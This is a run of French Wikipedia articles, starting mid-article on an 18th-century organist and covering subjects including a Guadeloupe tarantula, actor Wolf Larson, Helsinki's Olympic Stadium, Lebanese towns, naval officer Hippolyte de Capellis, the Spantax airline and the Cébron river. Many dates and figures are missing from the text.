À la mort de son père en 1763, il lui succède à l’orgue de l’Hospice de la Charité. À partir de la même année, il tient l’orgue aux concerts de l’Académie des beaux-arts de Lyon. Vers 1763, il épouse Marie Bérol, une cantatrice qui fera carrière à Lyon, puis à Paris. En , naît Jacques-Marie, qui deviendra lui aussi organiste et compositeur.
En 1771, la famille se retrouve à Paris, et Jean-Jacques devient organiste de l’Abbaye royale de Saint-Victor. L’année suivante, après concours, il succède à Louis-Claude Daquin à l’orgue de Saint-Paul.
Sa réputation est telle qu’il est invité, aux côtés de Claude Balbastre, Armand-Louis Couperin et Nicolas Séjan, à inaugurer le grand orgue de Saint-Sulpice, refait par François-Henri Clicquot, le . En 1788, son fils Jacques-Marie le supplée à Saint-Paul. Finalement, il occupe le poste de titulaire par quartiers de l’orgue de Notre-Dame de Paris de 1783 jusqu’en 1793, à la suppression des cultes. D’après Choron, son départ forcé de Saint-Paul et de Saint-Victor et la destruction des orgues « lui causèrent un chagrin extrêmement profond ; sa santé déclina rapidement. » Il mourut à Paris, le , à près de 60 ans.
Parmi ses compositions, signalons ses recueils de sonates pour pianoforte et violon et ses nombreuses pièces d'orgue publiées sous forme de « "Journal" »..
Il est cousin germain de son compatriote abbevillois, le graveur Jacques-Firmin Beauvarlet qui fit aussi carrière à Paris.

</doc>
<doc id="1874062" url="https://fr.wikipedia.org/wiki?curid=1874062" title="Holothele sulfurensis">
Holothele sulfurensis

Holothele sulfurensis est une espèce d'araignées mygalomorphes de la famille des Theraphosidae.
Distribution.
Cette espèce est endémique de Guadeloupe. Elle se rencontre sur la Soufrière de à d'altitude.
Description.
La femelle holotype mesure et le mâle paratype . Elle fréquente aussi bien les milieux ouverts que fermés.
Étymologie.
Son nom d'espèce, composé de "sulfur " et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, la Soufrière.

</doc>
<doc id="1874066" url="https://fr.wikipedia.org/wiki?curid=1874066" title="Wolf Larson">
Wolf Larson

Wolf Larson (né Wolfgang von Wyszecki le à Berlin, Allemagne - ) est un acteur canadien, d'origine allemande, installé à Los Angeles depuis 1985, qui a joué le rôle-titre dans la série télévisée "Tarzán" (1991-1994) aux côtés de Lydie Denier.
Fils du célèbre physicien, Gunter von Wyszecki dont le nom reste l'une des principales personnalités de la science de la couleur du XXe siècle et auteur de nombreuses publications.
Biographie.
Wolf Larson est né à Berlin-Ouest (décembre 1959), en Allemagne. 
Ses parents se sont rencontrés lorsque son père était en poste à Berlin durant six ans (sa mère étant d'origine scandinave).
Écrivain, producteur et acteur connu à l'échelle internationale pour ses rôles dans "Tarzan" (1991-1994) et "Los Angeles Heat" (1996-1998).
Son père, Gunther Wyszecki, était un docteur en physique et mathématiques, spécialiste de l'étude des couleurs. Wolf émigre avec sa famille au Canada lorsque son père devient directeur du Conseil national de recherches Canada en 1961 et, dans ses fonctions, participe à établir les couleurs du drapeau du Canada.
Wolf a souffert d'une amygdalite chronique quand il était petit, ce qui l'a contraint à manquer beaucoup l'école. Il avait un professeur particulier, mais cela n'a pas vraiment fonctionné. Wolf n'était pas bien de ne pouvoir jouer avec les autres enfants qu'il connaissait. A l'âge de 14 ans, ses amygdales ont été enlevées.
Il devint plus tard capitaine d'une équipe de football très populaire et commença à suivre des cours de théâtre mais pensant qu'il n'était pas assez bon, il abandonna ses ambitions d'acteur et commença à se concentrer sur le sport.
Wolf a intégré l'Université du Queen à Kingston, Ontario, où il a obtenu un Baccalauréat en Economie et Statistiques. Il a poursuivi ses études à l'Université du Nevada à Las Vegas, où il a obtenu son MBA , un tremplin vers ce qu'il espérait initialement pouvoir décrocher un emploi à Wall Street.
Il enseigne plutôt l'économie et les affaires pendant quelques années. Il est devenu acteur par le plus grand des hasards après avoir été serveur dans un club Chippendales.
Parmi les ayant incarné Tarzan, il est le seul qui a comme diplôme un MBA.
Wolf joue des rôles mineurs dans ses premières apparitions au cinéma, incluant "Mad About You" (1990), "Castlerock" (2000) et "Shakedown" (2002). Il décroche des rôles secondaires ou principaux dans "Expect No Mercy" (1995), "Tracks of the Killer" (1995) et dans les téléfilms "Hostile Force" (1997), "Le Souffle de l'enfer" ("Storm Chasers: Revenge of the Twister") (1998) et "La Mort en blanc" ("Avalanche Alley") (2001).
Wolf a également écrit le scénario de "Crash and Byrnes" (2000), où il tient la vedette dans un rôle vaguement familier qui n'est pas sans rappeler le tandem de choc de "L'Arme fatale", ou encore celui qu'il incarnait avec Steven Williams dans "L.A. Heat", ce dernier acteur qui faisant également partie de la distribution du film.

</doc>
<doc id="1874067" url="https://fr.wikipedia.org/wiki?curid=1874067" title="Comté de Stevens (Kansas)">
Comté de Stevens (Kansas)

Le comté de Stevens est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec l’Oklahoma. Fondé le 3 août 1886, il a été nommé en hommage à l'homme politique Thaddeus Stevens.
Siège et plus grande ville : Hugoton.

</doc>
<doc id="1874069" url="https://fr.wikipedia.org/wiki?curid=1874069" title="Calculi">
Calculi



</doc>
<doc id="1874070" url="https://fr.wikipedia.org/wiki?curid=1874070" title="Stade olympique d'Helsinki">
Stade olympique d'Helsinki

Le stade olympique d'Helsinki (en finnois et en suédois : "Olympiastadion") situé dans le quartier de Töölö, à environ du centre-ville d'Helsinki est le plus grand stade en Finlande. C'est le stade principal des Jeux olympiques d'été de 1952. Il a été construit pour y célébrer les Jeux olympiques d'été de 1940 qui ont été finalement annulés (auparavant attribués à Tokyo) en raison de la Seconde Guerre mondiale.
Le stade a également été le siège des Championnats du monde d'athlétisme, les tout premiers en 1983 et à nouveau en 2005. Il hébergera pour la les Championnats d'Europe d'athlétisme en 2012, après les éditions de 1971 et de 1994. C'est aussi le stade de l'Équipe de Finlande de football.
Histoire.
Le stade est conçu par Yrjö Lindegren et Toivo Jäntti. Ce dernier s'occupera de toutes les modifications ultérieures.
La construction du stade olympique a commencé en 1934 et a été achevée en 1938. Le stade a été entièrement modernisé en 1990-1994 et a également été rénové en 2005 pour les Championnats du monde d'athlétisme. Sa capacité de spectateurs était à son maximum au cours des Jeux olympiques de 1952 avec plus de spectateurs. De nos jours, le stade a en moyenne spectateurs.
Il est caractérisé par une tour haute de (dont la hauteur serait aussi celle d'un essai de lancer du javelot, un sport national).
D'importants travaux de rénovation du stade ont commencé au printemps 2016. Sur la structure extérieure, des panneaux de bois ornent dorénavant la partie haute de la façade. Pour ce qui est de la partie intérieure, toutes les tribunes ont été recouvertes par un nouveau toit en bois et la piste d'athlétisme a été renové. Le stade propose aussi désormais des zones de restauration étendues et davantage de sites couverts d'entraînement. Le complexe du stade abrite également le Musée du Sport, qui a rouvert ses portes en octobre 2020, ainsi qu’un restaurant aménagé dans un esprit « bistrot ». La rénovation a été achevée en septembre 2020. 

</doc>
<doc id="1874071" url="https://fr.wikipedia.org/wiki?curid=1874071" title="Boulevard Auguste Reyers">
Boulevard Auguste Reyers

Le boulevard Auguste Reyers (en néerlandais : "Auguste Reyerslaan") est une artère importante faisant partie de la Moyenne Ceinture de Bruxelles (R21) situé sur le territoire de la commune de Schaerbeek qui va de la place Général Meiser au square Vergote en passant par la place des Carabiniers, la rue du Saphir, l'avenue de l'Émeraude, l'avenue Émile Max, l'avenue de l'Opale, l'avenue Adolphe Lacomblé, l'avenue du Diamant, le début de l'autoroute Bruxelles-Liège, l'avenue de Roodebeek, l'avenue des Cerisiers et finalement la rue Général Gratry. Il est le prolongement du boulevard Général Wahis et est prolongé par le boulevard Brand Whitlock.
Origine du nom.
Le boulevard porte le nom d'un militaire belge et ancien bourgmestre de Schaerbeek, Auguste Reyers, né à Aarschot le et décédé à Schaerbeek le .&lt;br&gt;
D'autres voies ont reçu le nom d'un ancien bourgmestre schaerbeekois :
Histoire.
Le boulevard Auguste Reyers constitue la partie schaerbeekoise du grand boulevard circulaire proposé en 1866 par l'inspecteur-voyer Victor Besme dans son Plan d'ensemble pour l'extension et l'embellissement de l'Agglomération bruxelloise. Si l'aménagement de son tronçon longeant le Tir national, entre l'avenue de Roodebeek et la chaussée de Louvain, était déjà décidé en 1889, le reste du futur boulevard Auguste Reyers ne fut percé qu'à partir de 1909.
Le boulevard fut doté d'un terre-plein planté d'arbres et une zone de recul de réservée pour le bâti. La nouvelle artère qui devait s'appeler boulevard Militaire fut rebaptisée en 1911 en hommage à Auguste Reyers, bourgmestre de Schaerbeek de 1909 à 1921.
La création de l'autoroute Bruxelles-Liège, l'actuelle E 40, nécessita un réaménagement du boulevard. L'autoroute y était reliée par des tunnels à trémies symétriques vers la place Meiser et vers le square Vergote. La construction d'un viaduc, envisagée dès 1967 entre la rue Général Gratry et l'avenue de l'Opale, fut réalisée au début des années 1970. En 2014, à la suite de la découverte de fissures dans l'ouvrage, on entama sa rénovation. Comme celle-ci se révélait beaucoup plus coûteuse que prévu, elle fut interrompue et le gouvernement bruxellois décida de procéder à sa démolition.

</doc>
<doc id="1874073" url="https://fr.wikipedia.org/wiki?curid=1874073" title="Iodate">
Iodate

Un iodate est un composé chimique contenant l'anion iodate, de formule brute . Cet anion est la base conjuguée de l'acide iodique , et les iodates sont les sels de cet acide. L'anion a une configuration pyramidale à base triangulaire, l'atome d'iode étant lié à trois atomes d'oxygène.
On peut produire un iodate en réduisant un periodate avec un thioester "R"–S–"R’", réaction qui produit un sulfoxyde "R"–SO–"R’".
L'iodate de sodium , l'iodate d'argent et l'iodate de calcium sont des exemples d'iodates. Ces derniers ressemblent aux chlorates, avec de l'iode à la place du chlore.
En milieu acide, il se forme de l'acide iodique . 

</doc>
<doc id="1874074" url="https://fr.wikipedia.org/wiki?curid=1874074" title="Mad Tracks">
Mad Tracks

Mad Tracks est un jeu vidéo de course, de type "Micro Machines", édité à l'origine par Micro Application et développé par Load Inc. sur PC. Il est vendu au prix de environ et est téléchargeable sur le site officiel. Depuis 2007, le jeu est édité par D3 Publisher et téléchargeable sur Xbox 360, dans un service dédié aux jeux, le Xbox Live Arcade. Il coûte 800 points, ce qui correspond environ à . En , le jeu est sorti sur Wii, édité par Bigben Interactive.
Système de jeu.
C'est un "gameplay" très axé arcade avec notamment une conduite très facile à prendre en main. Les épreuves alternent courses et mini-jeux comme le billard ou le baby foot. Le jeu est orienté multijoueurs avec la présence de nombreux cadeaux (missile à tête chercheuse, flaque d'huile...) répartis tout au long de parcours, ce qui engendre de nombreux revirements de situation. Le jeu est jouable en multijoueurs local jusqu'à 4 sur le même écran (split screen).
Version Xbox 360.
La version Xbox 360 est sorti deux ans après la version Windows. Elle coûtait 800 points. S'ajoute deux packs bonus comprenant de nouveaux circuits et minis jeux (un pack coûtant 350 points). 

</doc>
<doc id="1874077" url="https://fr.wikipedia.org/wiki?curid=1874077" title="Marie-Céline de la Présentation">
Marie-Céline de la Présentation

Marie-Céline de la Présentation (Nojals-et-Clotte, - Talence, ) est une religieuse clarisse française reconnue bienheureuse par l'Église catholique et honorée le .
Biographie.
Jeanne Germaine Castang est née le à Nojals-et-Clotte, près de Bergerac, son père était un modeste propriétaire terrien, sa mère issue d'une famille de notaires. Elle est la cinquième enfant du couple.
À l'âge de , elle est atteinte par la poliomyélite qui lui laisse la jambe gauche paralysée. L'enfant toutefois continue son éducation auprès de ses parents d'abord, puis chez les sœurs de Saint Joseph où elle est déjà très remarquée par sa piété et sa dévotion à l'Eucharistie.
Son père essaye d'ouvrir un commerce, mais ayant fait de mauvaises affaires, il doit quitter la maison et partir chercher du travail à Bordeaux comme boulanger où toute la famille peut le rejoindre. Sur les du ménage, trois sont morts à Nojals-et-Clotte, et deux autres meurent à Bordeaux de tuberculose et de malnutrition. La famille est plongée dans la misère.
Jeanne Germaine est hébergée par charité dans une pension à Bordeaux où elle se prépare à la première communion et à la confirmation. Mais à la mort de sa mère, elle doit revenir à la maison s'occuper de son frère aîné, atteint de tuberculose, et qui meurt en 1893.
Depuis toute petite, Jeanne Germaine veut devenir religieuse, et entrer chez les Clarisses. Elle a l'occasion, en compagnie d'une amie, d'aller visiter une clarisse de sa connaissance dans son monastère. La mère supérieure discerne chez cette jeune fille handicapée une vocation remarquable, et elle est admise dans la communauté de Talence, le où elle prononce ses vœux, le , sous le nom de sœur Marie-Céline de la Présentation.
Atteinte de tuberculose, en plus de son handicap, elle supporte avec patience et rigueur la vie des moniales, accueillant avec humilité et discrétion les manifestations surnaturelles dont elle est l'objet.
Elle meurt à Talence (Gironde) le , âgée de . Dès sa mort, elle se manifeste à d'autres par de suaves odeurs, ce qui la fait nommer par son entourage la "sainte aux parfums".
Elle écrit juste avant sa mort à sa sœur : « "Je meurs sans regrets, je te donne rendez-vous au ciel… Là haut, je n'oublierai personne…" ».
Ses reliques ont été transférées dans l'église Sainte-Quitterie de Nojals en 2006.
Béatification.
Elle est déclarée Vénérable le . En décembre 2006, le Pape Benoît XVI reçoit le préfet de la Congrégation pour les causes des saints, le cardinal José Saraiva Martins, et promulgue les décrets relatifs à huit miracles attestés.
Elle est béatifiée le à la cathédrale de Bordeaux, en présence du cardinal Jean-Pierre Ricard, envoyé spécial du Pape, archevêque de Bordeaux et président de la Conférence des évêques de France.

</doc>
<doc id="1874086" url="https://fr.wikipedia.org/wiki?curid=1874086" title="Aley">
Aley

Aley est une bourgade libanaise du Mont Liban, près de Bhamdoun. Elle est le chef-lieu du caza d'Aley. La ville se situe à 17 km de Beyrouth, à l'Ouest de Bhamdoun et tout près du village de Souk El Gharb.
Situation démographique.
Les habitants originaires d'Aley sont majoritairement druzes. Une importante minorité chrétienne se repartit entre melchites, orthodoxes, et maronites. Beaucoup d'étrangers, particulièrement des ressortissants des pays arabes du Golfe Persique y possèdent des résidences secondaires où ils passent leurs étés, échappant ainsi à la chaleur et à l'humidité de la Péninsule Arabique.
Étymologie.
Le nom d’« Aley » proviendrait du syriaque ou de l'araméen, et signifierait « emplacement élevé », se référant à la haute altitude de la ville. En arabe, "aley" signifie "sur" (comme dans صلى الله عليه و سلم ou dans "Salam aley koum").
Histoire.
Aley s'est développée avec la construction du chemin de fer entre 1892 et 1895 permettant la liaison ferroviaire entre Aley et Beyrouth, mais aussi Aley et Damas. Le chemin de fer a fourni aux Beyrouthins un accès facile à Aley et à ses montagnes environnantes, faisant de Aley une destination populaire favorite pour passer les mois d'été et pour apprécier son climat agréable. La ville fut pendant un moment la capitale estivale des gouverneurs Ottomans du Mont-Liban. En 2001, la municipalité d'Aley a commencé à rénover le centre-ville, particulièrement son souk historique, et la ville a rapidement repris son rôle de centre touristique au Liban.
Tourisme.
Aley est une destination touristique majeure au Liban et au Moyen-Orient. Son emplacement stratégique et son climat en font un lieu privilégié pour faire des emplettes et prendre un repas copieux, particulièrement pour les Arabes fortunés des pays du Golfe. C’est une station balnéaire avec un nombre croissant de touristes et de visiteurs et une économie florissante dans le Mont-Liban. Aley a repris son lustre d'antan et son titre de « princesse des stations estivales ».
Le « Souk d’Aley » est un boulevard relativement long garni de palmiers. À l'est du boulevard, on peut admirer l’architecture ancienne des vieilles maisons en pierre avec des toits rouges, tandis qu'à l'ouest, on peut profiter des nombreux café-trottoirs, restaurants avec terrasse, et night clubs qui font d'Aley un des villages le plus dynamiques du Mont-Liban.
Une dizaine de magasins d’antiquités et de boutiques de détail bordent la rue qui constitue le cœur historique de la ville. Aley est également célèbre pour son casino.
Relations internationales.
Jumelage.
La ville de Aley est jumelée avec:

</doc>
<doc id="1874088" url="https://fr.wikipedia.org/wiki?curid=1874088" title="Square Eugène Plasky">
Square Eugène Plasky

Le square Eugène Plasky (en néerlandais : "Eugène Plaskysquare") est un square bruxellois de la commune de Schaerbeek située sur l'avenue Eugène Plasky. L'avenue du Diamant, l'avenue Émile Max et la rue Léon Frédéric y aboutissent également.
Origine du nom de la rue.
Ce square porte le nom d'un peintre belge, Eugène Plasky, né à Bruxelles le et décédé à Schaerbeek le . La dénomination du square date de 1909.

</doc>
<doc id="1874091" url="https://fr.wikipedia.org/wiki?curid=1874091" title="Bhamdoun">
Bhamdoun

Bhamdoun (en ) est une ville du Liban, située dans la vallée de Lamartine, près d'Aley et de Hammana et à de Beyrouth.
Elle est située à d'altitude sur la route Beyrouth - Damas.
De multiples hôtels de standing, d'innombrables restaurants et commerces en font un site très prisé des touristes essentiellement venus du golfe Persique.
La mer est à une demi-heure, des circuits sont proposés pour découvrir les alentours (le mont Liban, la Békaa, Baalbeck, Byblos)

</doc>
<doc id="1874093" url="https://fr.wikipedia.org/wiki?curid=1874093" title="Hippolyte de Capellis">
Hippolyte de Capellis

Hippolyte Louis Antoine, de Capellis, appelé le comte de Capellis, comte palatin, marquis du Fort, comte de Verrières (né le à Pernes et mort le à Avignon), est un officier de marine français. Capitaine de vaisseau en 1786 et chevalier de Saint-Louis, il émigre à la Révolution et passe au service de la Russie impériale (contre-amiral en 1799).
Biographie.
Origines et famille.
Il est le fils ainé de François de Capellis ( à Avignon - à Toulon), de Capellis, officier d’infanterie, passé sur le tard dans la marine (1756), capitaine de vaisseau (1771), commandant le du régiment de Toulon (1772), chevalier de Saint-Louis, d'une famille du Comtat Venaissin (Pernes-les-Fontaines), venue de Modène au moment du mariage de Catherine de Médicis ; lequel est marié le 16 et le , au château du Fort (Saint-Symphorien), en Gévaudan, à Louise de Beaumont de Gibaud (vers 1724 - 1749), marquise du Fort et dame de Verrières, d'une famille originaire de Saintonge, petite-nièce de Fénelon et descendante du maréchal d'Esparbes (mort en 1628). De cette union naissent :
Hippolyte de Capellis a été propriétaire de l'hôtel de Capellis, à Avignon, vendu en 1785 et connu depuis sous le nom d'Hôtel Desmarets de Montdevergues, mais aussi du domaine de La Nesquière, à Pernes-les-Fontaines, quartier des Valayans, exploité par sa famille depuis le XVIe siècle, et, venant de sa mère, du Château du Fort (Chambon-le-Château), en Gévaudan. Sa seconde épouse, Marie Félicité de Flahaut, a pour sa part possédé le Château de Saint-Remy-en-l'Eau, aux confins de l'Ile-de-France et de la Picardie, passé ensuite à leur fille aînée.
Carrière militaire.
Les débuts dans la Marine royale.
Reçu garde de la marine en 1758, à Brest, à l’âge de 14 ans, embarqué sur "La Valeur", sur "L’Opale" (1761-1762), puis sur "La Folle" (1762).
Promu Enseigne de vaisseau le , toujours à Brest, embarqué sur la frégate "La Dorade" (1770) puis sur "La Flore" (1771-1772), lieutenant au du régiment de Bordeaux (), embarqué sur "la Provence" (1776), puis sur "le César" (1777).
Lieutenant de vaisseau le , embarqué sur la frégate "l’Iphigénie", son frère cadet, Gabriel, étant pour sa part embarqué sur la frégate "la Belle Poule", dont il commande la batterie de canons ; blessé dans le fameux combat entre ce bâtiment et la frégate anglaise HMS "Arethusa" (de 32 canons), le , qui déclenche les hostilités entre Paris et Londres.
En , Capellis reçoit le commandement de la corvette de 16 canons "L’Epervier", appartenant à la flotte de Toulon ; il contribue fortement à la reconquête du Sénégal le 28-, faisant partie de l’expédition qui s'empare des forts de Gambie et de Sierra Leone. Il apporte au roi la nouvelle du succès de cette expédition ().
Chevalier de Saint Louis le (ou ?) à l’âge de 35 ans, et honoré d’une gratification du roi de 800 livres (1779).
La guerre d'indépendance des États-Unis.
En 1780, Capellis est embarqué comme lieutenant en second sur le vaisseau "Le Duc de Bourgogne", appartenant à l’armée navale de l’amiral comte de Guichen. Il participe aux batailles des , 15 et . Il sert comme aide-major du chef d’escadre de Ternay (1780) à Newport, fonction qu’il occupera de nouveau sous les ordres du chef d’escadre des Touches en 1781-1782.
En , il reçoit le commandement la frégate "L'Ariel", appartenant à un groupe de frégates arrivé à Boston depuis peu. Le il participe à la bataille du cap Henry, sous les ordres du chevalier Destouches. Capellis est l’un des neuf officiers dont l’amiral Jacques-Melchior de Barras de Saint-Laurent demande la promotion au grade de capitaine de vaisseau, appuyant un rapport de Destouches. Appartenant à l’escadre de Grasse, il participe au combat du 5 septembre 1781 en vue de la Chesapeake. Le le roi le gratifie d’une pension de 600 livres.
En , il commande la frégate la "Danaé" : « M. de Capellis, arrivant de France avec "La Danaé", la voit échouer par la maladresse du pilote. Il déploie une telle activité qu’il parvient à relever sa frégate et la remonte jusqu’à Philadelphie ». En 1782 le roi l’honore d’une gratification de .
Début 1783, il commande toujours "La Danaé" qui croise dans la Delaware, puis participe au transport des hommes de Lauzun vers la France. Le , Capellis quitte définitivement les États-Unis : "La Danaé", transportant 307 hommes du corps de Lauzun, met à la voile depuis Wilmington sur la Delaware. La frégate, ayant relâché au Portugal, mouille exactement un mois plus tard dans la rade de Brest.
Il commande ensuite "la Lamproie" (1784) et le roi l’honore d’une gratification de (1784). Admis aux honneurs de la Cour (). Il est promu capitaine de vaisseau le , à 42 ans. Affecté à la de Brest.
L'émigration.
Sa femme et lui appartiennent au salon mondain et intellectuel d’Adélaïde de Flahaut que fréquentent en particulier Talleyrand et, à partir de 1789, Gouverneur Morris. Il est à noter que c'est Hippolyte de Capellis qui a tenu Charles de Flahaut, sur les fonts baptismaux lors de son baptême en l'église Saint-Paul.
Émigré en Allemagne, puis en Russie, Capellis sert en mer Noire, face aux Turcs (1796), puis comme gouverneur du port militaire de Cronstadt, près de Saint-Pétersbourg, avec le grade de contre-amiral (1799). Rentré en France en 1801, il réside sous le Consulat entre Paris et le Vaucluse, où il est proche du maire d'Avignon Guillaume Puy.

</doc>
<doc id="1874095" url="https://fr.wikipedia.org/wiki?curid=1874095" title="Fédération UniAgro">
Fédération UniAgro

L'Union des ingénieurs diplômés des écoles nationales supérieures, dite Fédération UniAgro, est une association loi de 1901 reconnue d'utilité publique par un décret du . Anciennement dénommée Union nationale des ingénieurs agronomes (UNIA), elle fédère depuis une modification de ses statuts intervenue en 2006, les associations de diplômés de huit grandes écoles et établissements publics de l’Enseignement national supérieur agronomique, agroalimentaire et horticole : l'Institut national agronomique Paris-Grignon et l'Ecole nationale supérieure des industries agricoles et alimentaires de Massy (Agro ParisTech), Montpellier SupAgro, l'École nationale supérieure d'agronomie et des industries alimentaires de Nancy, l'École nationale supérieure agronomique de Rennes, l'École nationale supérieure agronomique de Toulouse, l'ENSA d'Alger, l'Institut national d'horticulture d'Angers et Versailles.
Elle réunit dans un même réseau plus de ingénieurs « Agro » actifs dans les sciences et technologies du vivant : ingénieurs agronomes, agro-alimentaires, horticoles et du paysage, tous reconnus du grade de Master of Sciences in Life Sciences, Agriculture, Food Technologies &amp; Environmental management.
Activités.
Cette fédération a pour objet de proposer des services et des outils de communication en mutualisant les ressources des associations de diplômés de chaque école. Ses domaines d’action principaux sont :
Organisation.
Le siège et les bureaux de la Fédération UniAgro se situent à Paris.
De plus, chaque région administrative française dispose d'un « Groupe régional » constitué en association loi 1901, responsable de l'agenda des activités organisées au niveau local pour les adhérents domiciliés dans chacune des régions.

</doc>
<doc id="1874096" url="https://fr.wikipedia.org/wiki?curid=1874096" title="Spantax">
Spantax

Spantax est une compagnie aérienne espagnole qui effectua des vols de 1959 à 1988. Son hub principal est alors à Palma dans l'île de Majorque, aux Baléares.
Fondée en 1959 sous le nom de "Spain Air Taxi" par Rodolfo Bay, un pilote célèbre en Espagne, les vols commencèrent avec des Douglas DC-3 assurant la liaison entre Palma à Majorque et un camp pétrolier dans le Sahara. En 1962, la compagnie propose des vols charter entre Majorque et plusieurs grandes villes européennes. 
La flotte s'agrandit avec d'autres Douglas DC-4, DC-6 et DC-7, puis des DC-9 et DC-10 afin de réaliser des vols transatlantiques. La compagnie sera une des rares à exploiter le Convair CV-990. En 1970, elle est la deuxième compagnie charter européenne avec plus de 2 millions de passagers par an. 
La compagnie perd trois avions (tous des CV-990) dans trois crashes :
La crise pétrolière de 1979 plonge Spantax dans une crise financière, aggravée par l'accident d'un DC-10 à Malaga en . Les difficultés financières s'aggravant, la compagnie est rachetée en 1987 par un groupe financier luxembourgeois, qui malgré l'application de plans sociaux et l'achat de Boeing 767 ne parvient pas à la redresser. La compagnie Spantax cesse toute activité en .

</doc>
<doc id="1874098" url="https://fr.wikipedia.org/wiki?curid=1874098" title="Sabre d'honneur">
Sabre d'honneur



</doc>
<doc id="1874099" url="https://fr.wikipedia.org/wiki?curid=1874099" title="Cébron">
Cébron

Le Cébron est une rivière française qui coule dans le département des Deux-Sèvres. C'est un affluent du Thouet en rive gauche, donc un sous-affluent de la Loire.
Géographie.
Le Cébron naît à la limite entre les communes de Fénery et de Clessé, dans la région bien arrosée des hauteurs de la Gâtine, au nord-ouest du département des Deux-Sèvres, vers d'altitude, et à une douzaine de kilomètres à l'ouest-nord-ouest de Parthenay. Son cours est globalement orienté du sud-ouest vers le nord-est. Le Cébron se jette dans le Thouet en rive gauche juste en face du bourg de Saint-Loup-sur-Thouet (commune de Saint-Loup-Lamairé), localité située à cinq kilomètres au sud-ouest d'Airvault, et à une vingtaine de kilomètres au nord-nord-est de Parthenay.
Affluents.
Les principaux affluents du Cébron sont deux ruisseaux, la Raconnière et la Taconnière, qui le rejoignent au niveau du lac du Cébron.
Communes traversées.
Le Cébron traverse successivement les communes de Clessé, Fénery, Saint-Germain-de-Longue-Chaume, Adilly, Saint-Aubin-le-Cloud, Châtillon-sur-Thouet, Amailloux, Viennay, Lageon, Gourgé, Louin et Saint-Loup-Lamairé, toutes situées dans le département des Deux-Sèvres.
Le barrage du Cébron-Puy Terrier.
Son cours est doté d'un important barrage (le barrage du Cébron-Puy Terrier) établi en limite des communes de Louin et Saint-Loup-Lamairé, à peu de distance de son confluent. La capacité de stockage de celui-ci est de 11,5 millions de m, soit l'équivalent du débit moyen du Cébron en fin de parcours, pendant plus de cinq mois. Il a pour fonction principale l'alimentation en eau potable d'une partie du département des Deux-Sèvres, mais après traitement de dépollution afin d'éliminer les micro-organismes et les matières organiques. Sept millions de m sont utilisés à cet effet chaque année, soit près de par jour ou 220 litres par seconde.
Le barrage fournit également de l'eau pour l'irrigation de deux mille hectares de terrain (). Le lac du Cébron, d'une superficie de , est aussi un lieu de loisirs, tels la pêche ou les sports nautiques. Enfin, c'est un milieu de reproduction pour les oiseaux migrateurs.
Hydronymie.
Le nom du Cébron est tiré de la racine préceltique *"Sab", désignant un élément liquide, suc, jus, et sève, ainsi que du suffixe "ara", tout comme la Sèvre Niortaise et la Sèvre Nantaise, ainsi que Sèvres, également préceltique.
Soit pour le Cébron : "sabara" avec un suffixe gaulois ou latin "-onem".
Hydrologie.
Impact du barrage.
La construction du barrage du Cébron-Puy Terrier a eu pour conséquence de modifier totalement les débits naturels. Deux stations hydrométriques fonctionnent sur le Cébron :
Les débits en amont du barrage.
Le Cébron se présente comme une rivière assez abondante, bénéficiant du climat relativement humide qui règne dans la région nord-est du département des Deux-Sèvres. Son débit a été observé sur une période de 26 ans (1983-2008), à Gourgé, en amont du barrage du Cébron. Le bassin versant de la rivière y est de soit 40 % de la totalité de celui-ci.
Le module de la rivière à Gourgé est de , soit 60 % du débit final.
Le Cébron présente des fluctuations saisonnières de débit très marquées. La période de hautes eaux se déroule en hiver et s'accompagne de débits mensuels moyens de , de décembre à février inclus (avec un maximum très net en janvier). Les mois de mars et d'avril constituent une période de transition à débits encore importants. En mai, le débit s'effondre et l'on aboutit ainsi à la période des basses eaux qui se déroule de juin à septembre, avec une très importante baisse du débit moyen mensuel allant jusqu'à au mois d'août, soit treize litres par seconde, ce qui représente un étiage moyen sévère, même pour un cours d'eau d'aussi petite taille. Cependant les fluctuations de débit peuvent être plus importantes d'après les années et sur des périodes plus courtes.
À l'étiage le VCN3 peut chuter jusque , en cas de période quinquennale sèche, le cours d'eau tombant ainsi à sec.
Les crues peuvent être très importantes compte tenu de la petitesse du bassin versant. Étant donné l'imperméabilité du terrain (sous-sols granitiques), les crues sont relativement aussi importantes que celles des affluents de la partie aval (méridionale) du bassin de la Mayenne (l'Oudon par exemple) ou des cours d'eau du bassin de la Sèvre nantaise. Les et valent respectivement . Le est de , le de , tandis que le n'a pu être calculé, faute de durée d'observation suffisante.
Le débit instantané maximal enregistré à Gourgé durant cette période, a été de le , tandis que le débit journalier maximal enregistré était de le . En comparant la première de ces valeurs à l'échelle des QIX de la rivière, il apparaît que cette crue était bien plus importante que celle définie par le , et donc tout à fait exceptionnelle.
On doit noter enfin qu'à cet endroit le Cébron est une rivière moyennement abondante. La lame d'eau écoulée dans cette portion de son bassin versant est de annuellement, ce qui est presque équivalent à la moyenne du bassin de la Loire (). Le débit spécifique (ou Qsp) de la rivière atteint par seconde et par kilomètre carré de bassin.
La situation en aval du barrage.
À la station hydrométrique de Saint-Loup-Lamairé, à la sortie du barrage, le débit du Cébron a été observé sur la même période de 26 ans (1983-2008). La surface étudiée y est de soit la quasi-totalité du bassin versant de la rivière.
Le module de la rivière à Saint-Loup-Lamairé est de .
La lame d'eau écoulée dans la totalité du bassin versant tombe à annuellement, ce qui est modéré. Son débit spécifique (ou Qsp) se monte dès lors à 6,4 litres par seconde et par kilomètre carré de bassin.

</doc>
<doc id="1874100" url="https://fr.wikipedia.org/wiki?curid=1874100" title="Commission des clauses abusives">
Commission des clauses abusives

Instituée par l’article L. 822-4 du code de la consommation, la Commission des clauses abusives ou CCA est placée auprès du ministre chargé de la consommation. Son rôle est d’émettre des avis et des recommandations sur le caractère abusif de clauses contractuelles. 
Un appui technique auprès de la CCA est fourni par l'Institut national de la consommation. L'INC et la CCA disposent de services communs dirigés par un directeur général. L'INC met ainsi à disposition des agents pour la réalisation du secrétariat et de travaux de la Commission.
Composition.
La Commission des clauses abusives est composée de magistrats, de personnalités qualifiées en droit ou technique des contrats, de représentants des consommateurs, de représentants des professionnels. Elle comprend ainsi treize membres répartis de la manière suivante :
1° Un magistrat de l’ordre judiciaire, président ;
2° Deux magistrats de l’ordre judiciaire ou administratif ou membres du Conseil d’Etat parmi lesquels est désigné le vice-président ;
3° Deux personnalités qualifiées en matière de droit ou de technique des contrats, choisies après avis du Conseil national de la consommation ;
4° Quatre représentants des professionnels ;
5° Quatre représentants des consommateurs.
